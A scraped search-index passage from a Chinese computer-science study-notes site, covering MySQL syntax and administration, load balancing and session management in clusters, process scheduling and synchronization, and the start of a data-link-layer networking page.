DATE_ADD() 高度灵活的日期运算函数 DATE_FORMAT() 返回一个格式化的日期或时间串 DAY() 返回一个日期的天数部分 DAYOFWEEK() 对于一个日期，返回对应的星期几 HOUR() 返回一个时间的小时部分 MINUTE() 返回一个时间的分钟部分 MONTH() 返回一个日期的月份部分 NOW() 返回当前日期和时间 SECOND() 返回一个时间的秒部分 TIME() 返回一个日期时间的时间部分 YEAR() 返回一个日期的年份部分 mysql\u0026gt; SELECT NOW(); 2018-4-14 20:25:11 数值处理 # 函数 说明 SIN() 正弦 COS() 余弦 TAN() 正切 ABS() 绝对值 SQRT() 平方根 MOD() 余数 EXP() 指数 PI() 圆周率 RAND() 随机数 分组 # 把具有相同的数据值的行放在同一组中。\n可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。\n指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。\nSELECT col, COUNT(*) AS num FROM mytable GROUP BY col; GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。\nSELECT col, COUNT(*) AS num FROM mytable GROUP BY col ORDER BY num; WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。\nSELECT col, COUNT(*) AS num FROM mytable WHERE col \u0026gt; 2 GROUP BY col HAVING num \u0026gt;= 2; 分组规定：\nGROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前； 除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出； NULL 的行会单独分为一组； 大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。 子查询 # 子查询中只能返回一个字段的数据。\n可以将子查询的结果作为 WHRER 语句的过滤条件：\nSELECT * FROM mytable1 WHERE col1 IN (SELECT col2 FROM mytable2); 下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次：\nSELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_num FROM Customers ORDER BY cust_name; 连接 # 连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。\n连接可以替换子查询，并且比子查询的效率一般会更快。\n可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。\n内连接 # 内连接又称等值连接，使用 INNER JOIN 关键字。\nSELECT A.value, B.value FROM tablea AS A INNER JOIN tableb AS B ON A.key = B.key; 可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。\nSELECT A.value, B.value FROM tablea AS A, tableb AS B WHERE A.key = B.key; 自连接 # 自连接可以看成内连接的一种，只是连接的表是自身而已。\n一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。\n子查询版本\nSELECT name FROM employee WHERE department = ( SELECT department FROM employee WHERE name = \u0026#34;Jim\u0026#34;); 自连接版本\nSELECT e1.name FROM employee AS e1 INNER JOIN employee AS e2 ON e1.department = e2.department AND e2.name = \u0026#34;Jim\u0026#34;; 自然连接 # 自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。\n内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。\nSELECT A.value, B.value FROM tablea AS A NATURAL JOIN tableb AS B; 外连接 # 外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。\n检索所有顾客的订单信息，包括还没有订单信息的顾客。\nSELECT Customers.cust_id, Customer.cust_name, Orders.order_id FROM Customers LEFT OUTER JOIN Orders ON Customers.cust_id = Orders.cust_id; customers 表：\ncust_id cust_name 1 a 2 b 3 c orders 表：\norder_id cust_id 1 1 2 1 3 3 4 3 结果：\ncust_id cust_name order_id 1 a 1 1 a 2 3 c 3 3 c 4 2 b Null 组合查询 # 使用 UNION 来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。\n每个查询必须包含相同的列、表达式和聚集函数。\n默认会去除相同行，如果需要保留相同行，使用 UNION ALL。\n只能包含一个 ORDER BY 子句，并且必须位于语句的最后。\nSELECT col FROM mytable WHERE col = 1 UNION SELECT col FROM mytable WHERE col =2; 视图 # 视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。\n对视图的操作和对普通表的操作一样。\n视图具有如下好处：\n简化复杂的 SQL 操作，比如复杂的连接； 只使用实际表的一部分数据； 通过只给用户访问视图的权限，保证数据的安全性； 更改数据格式和表示。 CREATE VIEW myview AS SELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_col FROM mytable WHERE col5 = val; 存储过程 # 存储过程可以看成是对一系列 SQL 操作的批处理。\n使用存储过程的好处：\n代码封装，保证了一定的安全性； 代码复用； 由于是预先编译，因此具有很高的性能。 命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。\n包含 in、out 和 inout 三种参数。\n给变量赋值都需要用 select into 语句。\n每次只能给一个变量赋值，不支持集合的操作。\ndelimiter // create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end // delimiter ; call myprocedure(@ret); select @ret; 游标 # 在存储过程中使用游标可以对一个结果集进行移动遍历。\n游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。\n使用游标的四个步骤：\n声明游标，这个过程没有实际检索出数据； 打开游标； 取出数据； 关闭游标； delimiter // create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; -- 定义了一个 continue handler，当 sqlstate \u0026#39;02000\u0026#39; 这个条件出现时，会执行 set done = 1 declare continue handler for sqlstate \u0026#39;02000\u0026#39; set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ; 触发器 # 触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。\n触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。\nINSERT 触发器包含一个名为 NEW 的虚拟表。\nCREATE TRIGGER mytrigger AFTER INSERT ON mytable FOR EACH ROW SELECT NEW.col into @result; SELECT @result; -- 获取结果 DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。\nUPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改的，而 OLD 是只读的。\nMySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。\n事务管理 # 基本术语：\n事务（transaction）指一组 SQL 语句； 回退（rollback）指撤销指定 SQL 语句的过程； 提交（commit）指将未存储的 SQL 语句结果写入数据库表； 保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。 不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。\nMySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。\n设置 autocommit 为 0 可以取消自动提交；autocommit 标记是针对每个连接而不是针对服务器的。\n如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。\nSTART TRANSACTION -- ... SAVEPOINT delete1 -- ... ROLLBACK TO delete1 -- ... COMMIT 字符集 # 基本术语：\n字符集为字母和符号的集合； 编码为某个字符集成员的内部表示； 校对字符指定如何比较，主要用于排序和分组。 除了给表指定字符集和校对外，也可以给列指定：\nCREATE TABLE mytable (col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci ) DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci; 可以在排序、分组时指定校对：\nSELECT * FROM mytable ORDER BY col COLLATE latin1_general_ci; 权限管理 # MySQL 的账户信息保存在 mysql 这个数据库中。\nUSE mysql; SELECT user FROM user; 创建账户\n新创建的账户没有任何权限。\nCREATE USER myuser IDENTIFIED BY \u0026#39;mypassword\u0026#39;; 修改账户名\nRENAME USER myuser TO newuser; 删除账户\nDROP USER myuser; 查看权限\nSHOW GRANTS FOR myuser; 授予权限\n账户用 username@host 的形式定义，username@% 使用的是默认主机名。\nGRANT SELECT, INSERT ON mydatabase.* TO myuser; 删除权限\nGRANT 和 REVOKE 可在几个层次上控制访问权限：\n整个服务器，使用 GRANT ALL 和 REVOKE ALL； 整个数据库，使用 ON database.*； 特定的表，使用 ON database.table； 特定的列； 特定的存储过程。 REVOKE SELECT, INSERT ON mydatabase.* FROM myuser; 更改密码\n必须使用 Password() 函数进行加密。\nSET PASSWROD FOR myuser = Password(\u0026#39;new_password\u0026#39;); "},{"id":18,"href":"/keeplearning/docs/system-design/cluster/","title":"集群","section":"系统设计","content":" 集群 # 一、负载均衡 # 集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。\n负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。\n负载均衡器可以用来实现高可用以及伸缩性：\n高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用； 伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。 负载均衡器运行过程包含两个部分：\n根据负载均衡算法得到转发的节点； 进行转发。 负载均衡算法 # 1. 轮询（Round Robin） # 轮询算法把每个请求轮流发送到每个服务器上。\n下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。\n该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。\n2. 加权轮询（Weighted Round Robbin） # 加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。\n例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。\n3. 最少连接（least Connections） # 由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。\n例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开，此时 (6, 4) 请求连接服务器 2。该系统继续运行时，服务器 2 会承担过大的负载。\n最少连接算法就是将请求发送给当前最少连接数的服务器上。\n例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。\n4. 加权最少连接（Weighted Least Connection） # 在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。\n5. 随机算法（Random） # 把请求随机发送到服务器上。\n和轮询算法类似，该算法比较适合服务器性能差不多的场景。\n6. 源地址哈希法 (IP Hash) # 源地址哈希通过对客户端 IP 计算哈希值之后，再对服务器数量取模得到目标服务器的序号。\n可以保证同一 IP 的客户端的请求会转发到同一台服务器上，用来实现会话粘滞（Sticky Session）\n转发实现 # 1. HTTP 重定向 # HTTP 重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的 IP 地址之后，将该地址写入 HTTP 重定向报文中，状态码为 302。客户端收到重定向报文之后，需要重新向服务器发起请求。\n缺点：\n需要两次请求，因此访问延迟比较高； HTTP 负载均衡器处理能力有限，会限制集群的规模。 该负载均衡转发的缺点比较明显，实际场景中很少使用它。\n2. DNS 域名解析 # 在 DNS 解析域名的同时使用负载均衡算法计算服务器 IP 地址。\n优点：\nDNS 能够根据地理位置进行域名解析，返回离用户最近的服务器 IP 地址。 缺点：\n由于 DNS 具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改 DNS 记录时，需要过很长一段时间才能生效。 大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。\n3. 反向代理服务器 # 反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。\n在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。\n优点：\n与其它功能集成在一起，部署简单。 缺点：\n所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。 4. 网络层 # 在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。\n源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。\n优点：\n在内核进程中进行处理，性能比较高。 缺点：\n和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。 5. 链路层 # 在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。\n通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从而不需要修改 IP 地址就可以进行转发。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。\n这是一种三角传输模式，被称为直接路由。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。\n这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。\n参考：\nComparing Load Balancing Algorithms Redirection and Load Balancing 二、集群下的 Session 管理 # 一个用户的 Session 信息如果存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器，由于服务器没有用户的 Session 信息，那么该用户就需要重新进行登录等操作。\nSticky Session # 需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的 Session 存放在该服务器中。\n缺点：\n当服务器宕机时，将丢失该服务器上的所有 Session。 Session Replication # 在服务器之间进行 Session 同步操作，每个服务器都有所有用户的 Session 信息，因此用户可以向任何一个服务器进行请求。\n缺点：\n占用过多内存； 同步过程占用网络带宽以及服务器处理器时间。 Session Server # 使用一个单独的服务器存储 Session 数据，可以使用传统的 MySQL，也使用 Redis 或者 Memcached 这种内存型数据库。\n优点：\n为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。 缺点：\n需要去实现存取 Session 的代码。 "},{"id":19,"href":"/keeplearning/docs/os/process-manage/","title":"进程管理","section":"操作系统","content":" 进程管理 # 进程与线程 # 1. 进程 # 进程是资源分配的基本单位。\n进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作。\n下图显示了 4 个程序创建了 4 个进程，这 4 个进程可以并发地执行。\n2. 线程 # 线程是独立调度的基本单位。\n一个进程中可以有多个线程，它们共享进程资源。\nQQ 和浏览器是两个进程，浏览器进程里面有很多线程，例如 HTTP 请求线程、事件响应线程、渲染线程等等，线程的并发执行使得在浏览器中点击一个新链接从而发起 HTTP 请求时，浏览器还可以响应用户的其它事件。\n3. 区别 # Ⅰ 拥有资源 # 进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属进程的资源。\nⅡ 调度 # 线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换。\nⅢ 系统开销 # 由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销。类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小。\nⅣ 通信方面 # 线程间可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助 IPC（Inter-Process Communication，进程间通信）。\n进程状态的切换 # 就绪状态（ready）：等待被调度 运行状态（running） 阻塞状态（waiting）：等待资源 应该注意以下内容：\n只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。 阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。 进程调度算法 # 不同环境的调度算法目标不同，因此需要针对不同环境来讨论调度算法。\n1. 批处理系统 # 批处理系统没有太多的用户操作，在该系统中，调度算法目标是保证吞吐量和周转时间（从提交到终止的时间）。\n1.1 先来先服务 first-come first-serverd（FCFS） # 非抢占式的调度算法，按照请求的顺序进行调度。\n有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。\n1.2 短作业优先 shortest job first（SJF） # 非抢占式的调度算法，按估计运行时间最短的顺序进行调度。\n长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。\n1.3 最短剩余时间优先 shortest remaining time next（SRTN） # 最短作业优先的抢占式版本，按剩余运行时间的顺序进行调度。 当一个新的作业到达时，其整个运行时间与当前进程的剩余时间作比较。如果新的进程需要的时间更少，则挂起当前进程，运行新的进程。否则新的进程等待。\n2. 交互式系统 # 交互式系统有大量的用户交互操作，在该系统中调度算法的目标是快速地进行响应。\n2.1 时间片轮转 # 将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。\n时间片轮转算法的效率和时间片的大小有很大关系：\n因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。 而如果时间片过长，那么实时性就不能得到保证。 2.2 优先级调度 # 为每个进程分配一个优先级，按优先级进行调度。\n为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。\n2.3 多级反馈队列 # 一个进程需要执行 100 个时间片，如果采用时间片轮转调度算法，那么需要交换 100 次。\n多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。\n每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。\n可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合。\n3. 实时系统 # 实时系统要求一个请求在一个确定时间内得到响应。\n分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。\n进程同步 # 1. 临界区 # 对临界资源进行访问的那段代码称为临界区。\n为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查。\n// entry section // critical section; // exit section 2. 同步与互斥 # 同步：多个进程因为合作产生的直接制约关系，使得进程有一定的先后执行关系。 互斥：多个进程在同一时刻只有一个进程能进入临界区。 3. 信号量 # 信号量（Semaphore）是一个整型变量，可以对其执行 down 和 up 操作，也就是常见的 P 和 V 操作。\ndown : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0； up：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。 down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。\n如果信号量的取值只能为 0 或者 1，那么就成为了互斥量（Mutex），0 表示临界区已经加锁，1 表示临界区解锁。\ntypedef int semaphore; semaphore mutex = 1; void P1() { down(\u0026amp;mutex); // 临界区 up(\u0026amp;mutex); } void P2() { down(\u0026amp;mutex); // 临界区 up(\u0026amp;mutex); } 使用信号量实现生产者-消费者问题\n问题描述：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品。\n因为缓冲区属于临界资源，因此需要使用一个互斥量 mutex 来控制对缓冲区的互斥访问。\n为了同步生产者和消费者的行为，需要记录缓冲区中物品的数量。数量可以使用信号量来进行统计，这里需要使用两个信号量：empty 记录空缓冲区的数量，full 记录满缓冲区的数量。其中，empty 信号量是在生产者进程中使用，当 empty 不为 0 时，生产者才可以放入物品；full 信号量是在消费者进程中使用，当 full 信号量不为 0 时，消费者才可以取走物品。\n注意，不能先对缓冲区进行加锁，再测试信号量。也就是说，不能先执行 down(mutex) 再执行 down(empty)。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行 down(empty) 操作，发现 empty = 0，此时生产者睡眠。消费者不能进入临界区，因为生产者对缓冲区加锁了，消费者就无法执行 up(empty) 操作，empty 永远都为 0，导致生产者永远等待下，不会释放锁，消费者因此也会永远等待下去。\n#define N 100 typedef int semaphore; semaphore mutex = 1; semaphore empty = N; semaphore full = 0; void producer() { while(TRUE) { int item = produce_item(); down(\u0026amp;empty); down(\u0026amp;mutex); insert_item(item); up(\u0026amp;mutex); up(\u0026amp;full); } } void consumer() { while(TRUE) { down(\u0026amp;full); down(\u0026amp;mutex); int item = remove_item(); consume_item(item); up(\u0026amp;mutex); up(\u0026amp;empty); } } 4. 管程 # 使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。\nc 语言不支持管程，下面的示例代码使用了类 Pascal 语言来描述管程。示例代码的管程提供了 insert() 和 remove() 方法，客户端代码通过调用这两个方法来解决生产者-消费者问题。\nmonitor ProducerConsumer integer i; condition c; procedure insert(); begin // ... end; procedure remove(); begin // ... end; end monitor; 管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否则其它进程永远不能使用管程。\n管程引入了 条件变量 以及相关的操作：wait() 和 signal() 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。\n使用管程实现生产者-消费者问题\n// 管程 monitor ProducerConsumer condition full, empty; integer count := 0; condition c; procedure insert(item: integer); begin if count = N then wait(full); insert_item(item); count := count + 1; if count = 1 then signal(empty); end; function remove: integer; begin if count = 0 then wait(empty); remove = remove_item; count := count - 1; if count = N -1 then signal(full); end; end monitor; // 生产者客户端 procedure producer begin while true do begin item = produce_item; ProducerConsumer.insert(item); end end; // 消费者客户端 procedure consumer begin while true do begin item = ProducerConsumer.remove; consume_item(item); end end; 经典同步问题 # 1. 哲学家进餐问题 # 五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。\n下面是一种错误的解法，如果所有哲学家同时拿起左手边的筷子，那么所有哲学家都在等待其它哲学家吃完并释放自己手中的筷子，导致死锁。\n#define N 5 void philosopher(int i) { while(TRUE) { think(); take(i); // 拿起左边的筷子 take((i+1)%N); // 拿起右边的筷子 eat(); put(i); put((i+1)%N); } } 为了防止死锁的发生，可以设置两个条件：\n必须同时拿起左右两根筷子； 只有在两个邻居都没有进餐的情况下才允许进餐。 #define N 5 #define LEFT (i + N - 1) % N // 左邻居 #define RIGHT (i + 1) % N // 右邻居 #define THINKING 0 #define HUNGRY 1 #define EATING 2 typedef int semaphore; int state[N]; // 跟踪每个哲学家的状态 semaphore mutex = 1; // 临界区的互斥，临界区是 state 数组，对其修改需要互斥 semaphore s[N]; // 每个哲学家一个信号量 void philosopher(int i) { while(TRUE) { think(i); take_two(i); eat(i); put_two(i); } } void take_two(int i) { down(\u0026amp;mutex); state[i] = HUNGRY; check(i); up(\u0026amp;mutex); down(\u0026amp;s[i]); // 只有收到通知之后才可以开始吃，否则会一直等下去 } void put_two(i) { down(\u0026amp;mutex); state[i] = THINKING; check(LEFT); // 尝试通知左右邻居，自己吃完了，你们可以开始吃了 check(RIGHT); up(\u0026amp;mutex); } void eat(int i) { down(\u0026amp;mutex); state[i] = EATING; up(\u0026amp;mutex); } // 检查两个邻居是否都没有用餐，如果是的话，就 up(\u0026amp;s[i])，使得 down(\u0026amp;s[i]) 能够得到通知并继续执行 void check(i) { if(state[i] == HUNGRY \u0026amp;\u0026amp; state[LEFT] != EATING \u0026amp;\u0026amp; state[RIGHT] !=EATING) { state[i] = EATING; up(\u0026amp;s[i]); } } 2. 读者-写者问题 # 允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。\n一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。\ntypedef int semaphore; semaphore count_mutex = 1; semaphore data_mutex = 1; int count = 0; void reader() { while(TRUE) { down(\u0026amp;count_mutex); count++; if(count == 1) down(\u0026amp;data_mutex); // 第一个读者需要对数据进行加锁，防止写进程访问 up(\u0026amp;count_mutex); read(); down(\u0026amp;count_mutex); count--; if(count == 0) up(\u0026amp;data_mutex); up(\u0026amp;count_mutex); } } void writer() { while(TRUE) { down(\u0026amp;data_mutex); write(); up(\u0026amp;data_mutex); } } 进程通信 # 进程同步与进程通信很容易混淆，它们的区别在于：\n进程同步：控制多个进程按一定顺序执行； 进程通信：进程间传输信息。 进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。\n1. 管道 # 管道是通过调用 pipe 函数创建的，fd[0] 用于读，fd[1] 用于写。\n#include \u0026lt;unistd.h\u0026gt; int pipe(int fd[2]); 它具有以下限制：\n只支持半双工通信（单向交替传输）； 只能在父子进程或者兄弟进程中使用。 2. FIFO # 也称为命名管道，去除了管道只能在父子进程中使用的限制。\n#include \u0026lt;sys/stat.h\u0026gt; int mkfifo(const char *path, mode_t mode); int mkfifoat(int fd, const char *path, mode_t mode); FIFO 常用于客户-服务器应用程序中，FIFO 用作汇聚点，在客户进程和服务器进程之间传递数据。\n3. 消息队列 # 相比于 FIFO，消息队列具有以下优点：\n消息队列可以独立于读写进程存在，从而避免了 FIFO 中同步管道的打开和关闭时可能产生的困难； 避免了 FIFO 的同步阻塞问题，不需要进程自己提供同步方法； 读进程可以根据消息类型有选择地接收消息，而不像 FIFO 那样只能默认地接收。 4. 信号量 # 它是一个计数器，用于为多个进程提供对共享数据对象的访问。\n5. 共享存储 # 允许多个进程共享一个给定的存储区。因为数据不需要在进程之间复制，所以这是最快的一种 IPC。\n需要使用信号量用来同步对共享存储的访问。\n多个进程可以将同一个文件映射到它们的地址空间从而实现共享内存。另外 XSI 共享内存不是使用文件，而是使用内存的匿名段。\n6. 套接字 # 与其它通信机制不同的是，它可用于不同机器间的进程通信。\n"},{"id":20,"href":"/keeplearning/docs/network/link-layer/","title":"链路层","section":"网络","content":" 链路层 # 基本问题 # 1. 封装成帧 # 将网络层传下来的分组添加首部和尾部，用于标记帧的开始和结束。\n2. 透明传输 # 透明表示一个实际存在的事物看起来好像不存在一样。\n帧使用首部和尾部进行定界，如果帧的数据部分含有和首部尾部相同的内容，那么帧的开始和结束位置就会被错误的判定。需要在数据部分出现首部尾部相同的内容前面插入转义字符。如果数据部分出现转义字符，那么就在转义字符前面再加个转义字符。在接收端进行处理之后可以还原出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。\n3. 差错检测 # 目前数据链路层广泛使用了循环冗余检验（CRC）来检查比特差错。\n信道分类 # 1. 广播信道 # 一对多通信，一个节点发送的数据能够被广播信道上所有的节点接收到。\n所有的节点都在同一个广播信道上发送数据，因此需要有专门的控制方法进行协调，避免发生冲突（冲突也叫碰撞）。\n主要有两种控制方法进行协调，一个是使用信道复用技术，一是使用 CSMA/CD 协议。\n2. 点对点信道 # 一对一通信。\n因为不会发生碰撞，因此也比较简单，使用 PPP 协议进行控制。\n信道复用技术 # 1. 频分复用 # 频分复用的所有主机在相同的时间占用不同的频率带宽资源。\n2. 时分复用 # 时分复用的所有主机在不同的时间占用相同的频率带宽资源。\n使用频分复用和时分复用进行通信，在通信的过程中主机会一直占用一部分信道资源。但是由于计算机数据的突发性质，通信过程没必要一直占用信道资源而不让出给其它用户使用，因此这两种方式对信道的利用率都不高。\n3. 统计时分复用 # 是对时分复用的一种改进，不固定每个用户在时分复用帧中的位置，只要有数据就集中起来组成统计时分复用帧然后发送。\n4. 波分复用 # 光的频分复用。由于光的频率很高，因此习惯上用波长而不是频率来表示所使用的光载波。\n5. 码分复用 # 为每个用户分配 m bit 的码片，并且所有的码片正交，对于任意两个码片 和 有\n为了讨论方便，取 m=8，设码片 为 00011011。在拥有该码片的用户发送比特 1 时就发送该码片，发送比特 0 时就发送该码片的反码 11100100。\n在计算时将 00011011 记作 (-1 -1 -1 +1 +1 -1 +1 +1)，可以得到\n其中 为 的反码。\n利用上面的式子我们知道，当接收端使用码片 对接收到的数据进行内积运算时，结果为 0 的是其它用户发送的数据，结果为 1 的是用户发送的比特 1，结果为 -1 的是用户发送的比特 0。\n码分复用需要发送的数据量为原先的 m 倍。\nCSMA/CD 协议 # CSMA/CD 表示载波监听多点接入 / 碰撞检测。\n多点接入 ：说明这是总线型网络，许多主机以多点的方式连接到总线上。 载波监听 ：每个主机都必须不停地监听信道。在发送前，如果监听到信道正在使用，就必须等待。 碰撞检测 ：在发送中，如果监听到信道已有其它主机正在发送数据，就表示发生了碰撞。虽然每个主机在发送数据之前都已经监听到信道为空闲，但是由于电磁波的传播时延的存在，还是有可能会发生碰撞。 记端到端的传播时延为 τ，最先发送的站点最多经过 2τ 就可以知道是否发生了碰撞，称 2τ 为\n争用期 